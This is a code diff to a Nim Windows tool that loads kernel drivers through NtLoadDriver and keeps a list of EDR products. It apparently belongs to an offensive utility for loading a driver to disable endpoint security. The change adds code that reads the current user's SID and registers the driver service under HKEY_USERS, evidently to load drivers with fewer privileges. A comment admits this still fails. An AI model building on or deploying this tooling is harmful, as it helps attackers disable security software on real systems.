@@ -58,6 +58,7 @@ let EDR_LIST: seq[string] = @[
 
 proc NtLoadDriver (driverServiceName: PUNICODE_STRING): NTSTATUS {.stdcall, dynlib:"ntdll", importc: "NtLoadDriver".}
 proc NtUnloadDriver (driverServiceName: PUNICODE_STRING): NTSTATUS {.stdcall, dynlib:"ntdll", importc: "NtUnloadDriver".}
+proc ConvertSidToStringSidW(sid: PSID, stringSid: ptr LPWSTR): BOOL {.stdcall, dynlib:"advapi32", importc: "ConvertSidToStringSidW".}
 
 proc enablePriv(priv:string): bool = 
     var
@@ -117,6 +118,60 @@ proc enablePriv(priv:string): bool =
         echo "[x] Failed to enable " & priv
         return false
 
+# If this fails it will return "NULL" and print the cause to stdout
+proc getCurrentUserSid(): string =
+  var
+    hToken: HANDLE
+    tokenInfoSize: DWORD
+    tokenInfo: PTOKEN_USER
+    pSidW: ptr UncheckedArray[WCHAR]
+
+  if not OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, addr hToken).bool:
+    echo "[x] Failed to open process token"
+    return "NULL"
+  echo "[*] Opened process token"
+
+  # Get the required token information size
+  echo "[-] Getting token info size"
+  GetTokenInformation(hToken, tokenUser, nil, 0, addr tokenInfoSize) #winim is not consistent with naming conventions :/
+
+  # Allocate memory for the token information
+  tokenInfo = cast[PTOKEN_USER](alloc(tokenInfoSize))
+  defer: dealloc(tokenInfo)
+
+  # Retrieve the token information
+  echo "[-] Getting token info"
+  if not GetTokenInformation(hToken, tokenUser, tokenInfo, tokenInfoSize, addr tokenInfoSize).bool:
+    echo "[x] Failed to get token information"
+    return "NULL"
+  echo "[*] Got token info"
+
+  # Convert SID to wide string representation
+  if not ConvertSidToStringSidW(tokenInfo.User.Sid, cast[ptr LPWSTR](addr pSidW)).bool:
+    echo "[x] Failed to convert SID to WSTRING"
+    echo &"{GetLastError():#x}"
+    return "NULL"
+  echo "[*] Converted SID to WSTRING"
+  
+  # LPWSTR to string conversion
+  var
+    i = 0
+    sid = ""
+  #echo "[test] S? -> " & pSidW[][0].char
+  while true:
+    if  pSidW[][i].char == cast[char](nil): break
+    sid = sid & char(pSidW[][i])  # ptr WideCString, ptr wstring, LPWSTR; all did not work as one would think :( don't love using UncheckedArray but such is life...
+    i += 1
+
+  LocalFree(cast[HLOCAL](pSidW))
+
+  echo "[*] SID found: " & $sid
+  # Clean up resources
+  # free(tokenInfo) I am leaving this as a mem leak cause f it for now. TODO: fix it
+  CloseHandle(hToken)
+
+  return $sid
+
 proc loadDriverService(driverPath: wstring): bool =
     var
         hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)
@@ -175,18 +230,22 @@ proc loadDriverNT(driverPath: wstring): bool =
     var
         ntStatus: NTSTATUS
         usRegPath: UNICODE_STRING
-        svcImgPath: string = r"\??\" & $driverPath # IDK what the fuck the `\??\` does but its needed and took me 3 hours to figure out
+        svcImgPath: string = r"\??\" & $driverPath 
         #svcImgPath: string = r"\??\C:\Windows\System32\drivers\zim.sys"
 
     var
         errorCode: ULONG
-        subKey = &"System\\CurrentControlSet\\Services\\{SVC_NAME}"
+        subKey = &"{getCurrentUserSid()}\\System\\CurrentControlSet\\Services\\{SVC_NAME}" # I tried with and without \Services, no go for either; both give me internal error ntstatus
         #subKey = &"System\\CurrentControlSet\\Services\\{SVC_NAME}"
-        pathSourceReg = &"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\{SVC_NAME}"
-        hkey = HKEY_LOCAL_MACHINE
+        #pathSourceReg = &"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\{SVC_NAME}"
+        pathSourceReg = &"\\Registry\\User\\{getCurrentUserSid()}\\System\\CurrentControlSet\\Services\\{SVC_NAME}"
+        hkey = HKEY_USERS
         hkResult: HKEY
         disposition: DWORD = 0
         svcType: DWORD = SERVICE_KERNEL_DRIVER
+
+    echo(&"Using key: {subKey}")
+    echo(&"Using passing to NtLoadDriver: {pathSourceReg}")
 
     errorCode = RegCreateKeyEx(hkey, # A handle to an open registry key.
                                cast[LPWSTR](addr newWideCString(subKey)[0]), # The name of a subkey that this function opens or creates. 
